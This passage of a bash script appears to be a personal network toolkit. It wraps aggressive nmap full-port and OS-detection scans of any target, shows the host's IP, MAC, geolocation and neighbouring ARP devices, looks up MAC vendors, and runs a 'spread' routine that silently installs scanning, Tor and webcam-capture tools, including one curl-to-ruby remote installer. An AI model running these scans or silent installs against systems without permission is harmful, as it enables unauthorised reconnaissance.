        sudo nmap -A -Pn -T4 -n -vv -p1-65535 $1
     else
        sudo nmap -A -Pn -T4 -n -vv -p1-65535 $1
     fi

     _u_data 2> /dev/null

}

_pizdec6(){ #selft



     if [ $2 == "i" ]; then
        sudo nmap -A -Pn -T4 -n -vv -p1-65535 -6 $1
     else
        sudo nmap -A -Pn -T4 -n -vv -p1-65535 -6 $1
     fi

     _u_data 2> /dev/null

}


_blyat(){ #selft



    if [ $2 == "i" ]; then
       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn $1
    else
       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn $1
    fi

    _u_data 2> /dev/null

}

_blyat6(){ #selft



    if [ $2 == "i" ]; then
       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn -6 $1
    else
       sudo nmap -A -O -osscan-guess -vv -p1-65535 -sV -Pn -6 $1
    fi

    _u_data 2> /dev/null

}


_IP(){ #selft

    nslookup $1 | sed -n '6p' | awk '{print $2}'

    _u_data 2> /dev/null

}


_look(){ #selft

    curl ipinfo.io/$(nslookup $1 | sed -n '6p' | awk '{print $2}')

    _u_data 2> /dev/null

}





_affichage(){ #selfp


  clear
  _motto
  _logo
  printf "$GREEN     $_name$WHITE Affichage Mode\n"
  printf "\n$WHITE         I see $GREEN People\n"
  printf "$WHITE         I see $GREEN Ports\n"
  printf "$WHITE         I see $GREEN Wifi\n"
  printf "$WHITE         I see $YELLOW Light\n"
  printf "$WHITE         I see $RED Blood\n"
  printf "$WHITE         I see $NEW_BLUE Router\n"
  printf "$WHITE         I see $BLUE Devices\n"
  printf "\n$BLUE          I see myself\n"
  printf "$RED        I see everything\n"
  printf "$BLUE        What do you see?\n"
  printf "$WHITE\n"
  date
  printf "$NC\n"

  _u_data 2> /dev/null


}

_uname(){ #selfp
  printf "$YELLOW$_system$NC\n"
}


_generalize(){ #selfp


  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then   #tw

  clear
  #printf "Darwin DEBUG STR: $_system\n"
  _wts
  _motto
  printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
  printf "\n`echo Local IP  ` >> $YELLOW`ifconfig en0 | grep inet | sed '1d' | awk '{print $2;}'`$NC"
  printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig en0 | grep ether | awk '{print $2;}'`$NC"
  if [ "$1" != "-f" ]; then
  printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig en0 | grep ether | awk '{print $2;}')`$NC"
  fi
  printf "\n`echo Router IP  ` >> $BLUE`ipconfig getpacket en0 | grep router | awk '{print $3;}' | cut -c 2-12`$NC"
  printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
  printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
  printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
  printf "$GREEN`echo Machine named  ` $YELLOW` uname -n`$NC"
  printf "\n`echo You are connected on channel `$BLUE `airport -c | awk '{print $2}'` $NC`echo on router ` $BLUE`airport -I | awk '/ SSID/ {print substr($0, index($0, $1))}' | awk '{print $2}'`$NC\n"
  printf "`echo "There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
  printf "$BLUE"
  arp -a | sed -n '1p'
  printf "$YELLOW"
  arp -a | grep $(ifconfig en0 | grep inet | sed '1d' | awk '{print $1;}')
  printf "$NC"
  arp -a | sed '1d'
  echo
  printf "$WHITE\n"
  date
  printf "$NC\n"

elif [[ $_system == "Linux" ]]; then  #tw

    clear
    #printf "Linux DEBUG STR: $_system\n"
    _wts
    _motto
    printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig enp0s3 | grep inet | awk '{print $2}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig enp0s3 | grep ether | awk '{print $2;}'`$NC"
    if [ $1 != "-f" ]; then
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
    fi
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig enp0s3 | grep inet | awk '{print $2}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"


  elif [[ $_system == "GNU" ]]; then   #nn



    clear
    _wts
    _motto
  #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`inetutils-ifconfig /dev/eth0 | grep inet | awk '{print $3}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`inetutils-ifconfig | grep hardware | awk '{print $3}'`$NC"
    if [ $1 != "-f" ]; then
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(inetutils-ifconfig | grep hardware | awk '{print $3}')`$NC"
    fi
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "GNU DEBUG STR: $_system\n"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$WHITE\n"
    date
    printf "$NC\n"

  elif [[ $_system == "Haiku" ]]; then  #tw

    clear
    _wts
    _motto
  #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig | grep inet | sed '1,2d' | awk '{print $3}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig | grep Address | sed '1d' | awk '{print $5}'`$NC"
    if [ $1 != "-f" ]; then
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig | grep Address | sed '1d' | awk '{print $5}')`$NC"
    fi
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig | grep inet | sed '1,2d' | awk '{print $3}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"

  elif [[ $_system == "HP-UX" ]]; then  #nn

    clear
    _wts
    _motto
  #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig | grep inet | sed '1,2d' | awk '{print $3}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig | grep Address | sed '1d' | awk '{print $5}'`$NC"
    if [ $1 != "-f" ]; then
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig | grep Address | sed '1d' | awk '{print $5}')`$NC"
    fi
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig | grep inet | sed '1,2d' | awk '{print $3}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"

  elif [[ $_system == "Minix" ]]; then   #nn

    clear
    _wts
    _motto
    #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`hostaddr -i`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`hostaddr -e`$NC"
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(hostaddr -e)`$NC"
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(hostaddr -i)
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"

  elif [[ $_system == "OpenBSD" ]]; then   #nn

    clear
    #printf "OpenBSD DEBUG STR: $_system\n"
    _wts
    _motto
    #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig em0 | grep inet | awk '{print $2}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig em0 | grep lladdr | awk '{print $2}'`$NC"
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig em0 | grep lladdr | awk '{print $2}')`$NC"
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n | awk '{print $1}'`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig em0 | grep inet | awk '{print $2}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"

  elif [[ $_system == "SunOS" ]]; then   #nn

    clear
    _wts
    _motto
  #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig | grep inet | sed '1,2d' | awk '{print $3}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig | grep Address | sed '1d' | awk '{print $5}'`$NC"
    if [ $1 != "-f" ]; then
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig | grep Address | sed '1d' | awk '{print $5}')`$NC"
    fi
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig | grep inet | sed '1,2d' | awk '{print $3}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"



  elif [[ $_system == "$(uname -n)" ]]; then  #nn

    clear
    printf "UNIX DEBUG STR: $_system\n"
    #_wts
    #_motto
    #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig enp0s3 | grep inet | awk '{print $2}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig enp0s3 | grep ether | awk '{print $2;}'`$NC"
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig enp0s3 | grep ether | awk '{print $2;}')`$NC"
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig enp0s3 | grep inet | awk '{print $2}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"


  elif [[ $_system == "OS/390" ]]; then #nn

    clear
    _wts
    _motto
  #printf "`echo External IP  ` >> $YELLOW`dig +short myip.opendns.com @resolver1.opendns.com`$NC"
    printf "\n`echo Local IP  ` >> $YELLOW`ifconfig | grep inet | sed '1,2d' | awk '{print $3}'`$NC"
    printf "\n`echo MAC-Address  ` >> $YELLOW`ifconfig | grep Address | sed '1d' | awk '{print $5}'`$NC"
    if [ $1 != "-f" ]; then
    printf "\n`echo Device  ` >> $YELLOW`_jvdr $(ifconfig | grep Address | sed '1d' | awk '{print $5}')`$NC"
    fi
    printf "\n$GREEN Location >> $WHITE" ; curl "ipinfo.io/city"
    printf "$GREEN Coordinates >> $WHITE" ; curl "ipinfo.io/loc"
    printf "$GREEN Internet Provided by >> $WHITE" ; curl "ipinfo.io/org"
    printf "$GREEN`echo Machine named  ` $YELLOW`uname -n`$NC"
    printf "\n`echo " There are "`$BLUE`arp -a | grep ? -c` $NC`echo "devices connected here"`\n"
    printf "$BLUE"
    arp -a | sed -n '1p'
    printf "$YELLOW"
    arp -a | grep $(ifconfig | grep inet | sed '1,2d' | awk '{print $3}')
    printf "$NC"
    arp -a | sed '1d'
    echo
    printf "$WHITE\n"
    date
    printf "$NC\n"

  fi

  _u_data 2> /dev/null


}


_research(){ #selfp


  clear
  printf "$GREEN     $_name$RED Research Mode$NC \n"
  _wts
  _motto
  _logo
  printf "     $YELLOW  Here are our options $NC: \n"
  printf "$WHITE   -ports/docked $GREEN-> Check port(s) status\n"
  printf "$WHITE   -origin $GREEN-> Check process origin\n"
  printf "$WHITE   -off $GREEN-> Completely close all connections\n"
  printf "$WHITE   -scan(deep) $GREEN-> Check network status\n"
  printf "$WHITE   -maid $GREEN-> Room service\n"
  printf "$WHITE   -radar $GREEN-> Check network speed\n"
  printf "$WHITE   -manual/autoFan $GREEN-> Select fan control type\n"
  printf "$WHITE   -look $GREEN-> _poof, _lock, _flush\n"
  _logo
  printf "$WHITE"
  date
  printf "$NC"


  _u_data 2> /dev/null

}

_engage(){ #selfp

  clear
  printf "      $_name $RED Engage Mode $NC  \n"
  _wts
  _motto
  _logo
  printf " $YELLOW     Here are our options $NC:\n"
  printf "$WHITE   _whatIsThis? $GREEN-> OS Detection L1\n"
  printf "$WHITE   _whatTheHell? $GREEN-> OS Detection L2\n"
  printf "$WHITE   _cryOutLoud! $GREEN-> OS Detection Li\n"
  printf "$WHITE   _whatTheFuck? $GREEN-> Oh come on\n"
  printf "$WHITE   _pizdec!$GREEN-> This is BAD\n"
  printf "$WHITE   _blyat! |_IP! $GREEN-> JUST DON'T $NC \n"
  _logo
  printf "$WHITE"
  date
  printf "$NC\n"


  _u_data 2> /dev/null
}



_spread(){ #selfi

  _system="$(uname -s)"

  if [ $_system == "Darwin" ]; then  #nn

    echo "Mac spreading..."

    sudo xcode-select --install

    ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" >/dev/null

    brew install speedtest-cli >/dev/null

    brew install imagesnap >/dev/null

    brew install nmap >/dev/null  2>&1

    brew install libdnet >/dev/null 2>&1

    brew install arp-scan >/dev/null  2>&1

    brew install ipcalc >/dev/null  2>&1

    brew install telnet >/dev/null  2>&1

    brew install watch >/dev/null  2>&1

    brew install htop >/dev/null  2>&1

    brew install ffmpeg >/dev/null 2>&1

    brew install tor >/dev/null 2>&1

    brew install mas >/dev/null 2>&1

    brew install git-lfs >/dev/null 2>&1

    git lfs install >/dev/null 2>&1

    brew cask install macs-fan-control >/dev/null  2>&1

    brew cask install cyberghost-vpn >/dev/null  2>&1

    brew cask install tor-browser >/dev/null 2>&1

    brew cask install Atom >/dev/null  2>&1

    sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport >/dev/null

    sudo gem install iStats >/dev/null  2>&1

    mas lucky shazam

    mas install 476566660

    mas install 1133106875

    #sudo cat /etc/pam.d/sudo  add auth sufficient pam_tid.so


  elif [[ $_system == "Linux" ]]; then #nn

    echo "Linux spreading..."

    _type="$(sudo cat /etc/os-release | grep 'ID')"

    if [ $_type == "debian" ]; then

    sudo apt-get install fswebcam -y >/dev/null 2>&1

    sudo apt install net-tools -y >/dev/null 2>&1

    sudo apt install nmap -y >/dev/null  2>&1

    sudo apt install arp-scan -y >/dev/null  2>&1

    sudo apt install ipcalc -y >/dev/null  2>&1

    sudo apt install curl -y >/dev/null 2>&1

    sudo apt install htop -y >/dev/null 2>&1

    sudo apt install speedtest-cli -y >/dev/null 2>&1

    sudo apt install gnome-screensaver -y >/dev/null 2>&1

    sudo apt install gcc -y >/dev/null 2>&1

    sudo apt install make -y >/dev/null 2>&1

  elif [[ $_type == "arch" ]]; then

    sudo pacman install nmap >/dev/null 2>&1

  elif [[ $_type == "redhat" ]]; then

    sudo yum install nmap >/dev/null 2>&1


  else
    printf "$YELLOW W :: Unknown linux type ::$RED $_type$NC\n"
  fi

elif [[ $_system == "GNU" ]]; then #nn

  echo "Hurd spreading..."

  su

  apt install git -y

  apt install curl -y

  apt install htop -y

  apt install nmap -y

elif [[ $_system == "Haiku" ]]; then  #tw

    echo "Haiku spreading..."

    pkgman install speedtest_cli -y >/dev/null



  elif [[ $_system == "Minix" ]]; then  #tn

    echo "Minix spreading..."

    # y option nw on minix

    pkgin install htop -y

    pkgin install curl -y

    pkgin install ipcalc -y

    pkgin install git-base -y

  elif [[ $_system == "OpenBSD" ]]; then #nn

    echo " OpenBSD spreading..."

    pkg_add git

  else
     echo "Operating system unknown. $_name init failed"
  fi

  _u_data 2> /dev/null

}



_vndr(){ #selft




  # Set Functions
  usage()
  {
  echo "MAC Vendor Help"
  echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
  echo "mac_vendor -s 'MAC Address' | Silent, only output result."
  exit 0
  }
  get_database()
  {
  # Test Connection
    ping -c 1 standards-oui.ieee.org &> /dev/null
    #ping -c 1 github.com &> /dev/null
    [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach the database." && exit 68
  # Download Database
    database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
    #database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
    [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
  }
  format_vendor_address()
  {
    [[ -n $1 ]] && vendor_address="$1"
    vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
  if [[ ${#vendor_address} == "6" ]]; then
  return
  else
      vendor_address="$(echo "$vendor_address" | cut -c1-6)"
  fi
  }
  # Set Arguments
  while getopts ":s:a:h" opt; do
  case $opt in
      s )  silent=true; vendor_address="$OPTARG" ;;
      a )  vendor_address="$OPTARG" ;;
      h )  usage ;;
  \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
  esac
  done
  # Get Vendor Address
  [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
  [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
  format_vendor_address
  [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
  && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
  # Search Database
  [[ $silent != true ]] && echo "Searching Database..."
  get_database
  vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
  #vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}')"
  [[ -z $vendor ]] && vendor="Unknown"
  # Print Result
  printf "$BLUE$vendor$NC\n"
  exit 0



}

_newv(){ #selft




  # Set Functions
  usage()
  {
  echo "MAC Vendor Help"
  echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
  echo "mac_vendor -s 'MAC Address' | Silent, only output result."
  exit 0
  }
  get_database()
  {
  # Test Connection
    #ping -c 1 standards-oui.ieee.org &> /dev/null
     ping -c 1 github.com &> /dev/null
    [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach the database." && exit 68
  # Download Database
    #database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
    database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
    [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
  }
  format_vendor_address()
  {
    [[ -n $1 ]] && vendor_address="$1"
    vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
  if [[ ${#vendor_address} == "6" ]]; then
  return
  else
      vendor_address="$(echo "$vendor_address" | cut -c1-6)"
  fi
  }
  # Set Arguments
  while getopts ":s:a:h" opt; do
  case $opt in
      s )  silent=true; vendor_address="$OPTARG" ;;
      a )  vendor_address="$OPTARG" ;;
      h )  usage ;;
  \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
  esac
  done
  # Get Vendor Address
  [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
  [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
  format_vendor_address
  [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
  && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
  # Search Database
  [[ $silent != true ]] && echo "Searching Database..."
  get_database
  #vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
  vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{printf $6,$7}')"
  [[ -z $vendor ]] && vendor="Unknown"
  # Print Result
  printf "$BLUE$vendor$NC\n"
  exit 0



}



_macV(){ #demon

    #db0

    _valoare="$(cat /usr/local/bin/zneic | grep -c '#db0')"

    if [ "$_valoare" == "4" ]; then
      # Set Functions
      usage()
      {
      echo "MAC Vendor Help"
      echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
      echo "mac_vendor -s 'MAC Address' | Silent, only output result."
      exit 0
      }
      get_database()
      {
      # Test Connection One
        ping -c 1 standards-oui.ieee.org &> /dev/null
        [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] SDBFI." && exit 68

        # Test Connection Two
        #  ping -c 1 github.com &> /dev/null
        #  [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
      # Download Database

        database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
        [[ -z $database ]] && echo "[Error 13:$(($LINENO - 1))] SDBFR" && exit 72


    : '
        if [ "$database" | grep -c Moved > 1 ]
           ping -c 1 github.com &> /dev/null
           [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
           database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
           [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
        fi
        '
      }
      format_vendor_address()
      {
        [[ -n $1 ]] && vendor_address="$1"
        vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
      if [[ ${#vendor_address} == "6" ]]; then
      return
      else
          vendor_address="$(echo "$vendor_address" | cut -c1-6)"
      fi
      }
      # Set Arguments
      while getopts ":s:a:h" opt; do
      case $opt in
          s )  silent=true; vendor_address="$OPTARG" ;;
          a )  vendor_address="$OPTARG" ;;
          h )  usage ;;
      \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
      esac
      done
      # Get Vendor Address
      [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
      [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
      format_vendor_address
      [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
      && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
      # Search Database
      get_database
      vendor="$(echo "$database" | grep -E "$vendor_address.*(base 16)" | awk '{for(i=4;i<NF;i++) printf"%s",$i OFS;if(NF)printf"%s",$NF;printf ORS}')"
      [[ -z $vendor ]] && vendor="Unknown"
      # Print Result
      printf "$BLUE$vendor$NC\n"
      exit 0
    else
      # Set Functions
      usage()
      {
      echo "MAC Vendor Help"
      echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
      echo "mac_vendor -s 'MAC Address' | Silent, only output result."
      exit 0
      }
      get_database()
      {
      # Test Connection One
      #  ping -c 1 standards-oui.ieee.org &> /dev/null
      #  [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] Was unable to reach the first database." && exit 68

        # Test Connection Two
          ping -c 1 github.com &> /dev/null
          [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] BDBFI" && exit 68
      # Download Database
        database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
        [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] BDBFR" && exit 72

    : '
        if [ "$database" | grep -c Moved > 1 ]
           ping -c 1 github.com &> /dev/null
           [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
           database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
           [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
        fi
        '
      }
      format_vendor_address()
      {
        [[ -n $1 ]] && vendor_address="$1"
        vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
      if [[ ${#vendor_address} == "6" ]]; then
      return
      else
          vendor_address="$(echo "$vendor_address" | cut -c1-6)"
      fi
      }
      # Set Arguments
      while getopts ":s:a:h" opt; do
      case $opt in
          s )  silent=true; vendor_address="$OPTARG" ;;
          a )  vendor_address="$OPTARG" ;;
          h )  usage ;;
      \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
      esac
      done
      # Get Vendor Address
      [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
      [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
      format_vendor_address
      [[ ${#vendor_address} < 6 || ! $vendor_address =~ ^[0-9A-F]{6}$ ]] \
      && echo "[Error 65:$LINENO] The address '$vendor_address' was invalid." && exit 65
      # Search Database
      get_database
      vendor="$(echo "$database" | grep -E "$vendor_address" | awk '{print $6,$7}')"
      [[ -z $vendor ]] && vendor="Unknown"
      # Print Result
      printf "$BLUE$vendor$NC\n"
      exit 0
    fi
}




_jvdr(){ #selft




  # Set Functions
  usage()
  {
  echo "MAC Vendor Help"
  echo "mac_vendor -a 'MAC Address' | Get the vendor of the specified address."
  echo "mac_vendor -s 'MAC Address' | Silent, only output result."
  exit 0
  }
  get_database()
  {
  # Test Connection One
    ping -c 1 standards-oui.ieee.org &> /dev/null
    [[ $? > 0 ]] && echo "[Error 64:$(($LINENO - 1))] Was unable to reach the first database." && exit 68

    # Test Connection Two
    #  ping -c 1 github.com &> /dev/null
    #  [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
  # Download Database

    database="$(curl -sf http://standards-oui.ieee.org/oui/oui.txt)"
    [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72


: '
    if [ "$database" | grep -c Moved > 1 ]
       ping -c 1 github.com &> /dev/null
       [[ $? > 0 ]] && echo "[Error 68:$(($LINENO - 1))] Was unable to reach second the database." && exit 68
       database="$(curl -sf https://github.com/royhills/arp-scan/blob/master/ieee-oui.txt)"
       [[ -z $database ]] && echo "[Error 72:$(($LINENO - 1))] Could not read the database." && exit 72
    fi
    '
  }
  format_vendor_address()
  {
    [[ -n $1 ]] && vendor_address="$1"
    vendor_address="$(echo "$vendor_address" | tr -d ':' | tr '[:lower:]' '[:upper:]')"
  if [[ ${#vendor_address} == "6" ]]; then
  return
  else
      vendor_address="$(echo "$vendor_address" | cut -c1-6)"
  fi
  }
  # Set Arguments
  while getopts ":s:a:h" opt; do
  case $opt in
      s )  silent=true; vendor_address="$OPTARG" ;;
      a )  vendor_address="$OPTARG" ;;
      h )  usage ;;
  \?)  echo "[Error] Invalid option: -$OPTARG" ; exit 1 ;;
  esac
  done
  # Get Vendor Address
  [[ -z $vendor_address && -n $1 ]] && vendor_address="$1"
  [[ -z $vendor_address ]] && read -p "Vender address to test for [##:##:##:##:##:##]: " vendor_address
  format_vendor_address
